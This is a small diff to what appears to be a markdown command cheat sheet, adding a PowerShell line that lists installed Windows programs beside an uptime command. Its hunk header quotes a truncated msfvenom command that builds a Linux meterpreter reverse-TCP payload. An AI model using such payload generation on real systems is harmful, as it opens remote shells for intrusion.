@@ -223,4 +223,6 @@ sudo msfvenom -a x64 --platform linux -p linux/x64/meterpreter/reverse_tcp LHOST
 
 ```
 (get-date) - (gcim Win32_OperatingSystem).LastBootUpTime # uptime
+Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table –AutoSize # List of Your Installed Programs on Windows
+
 ```
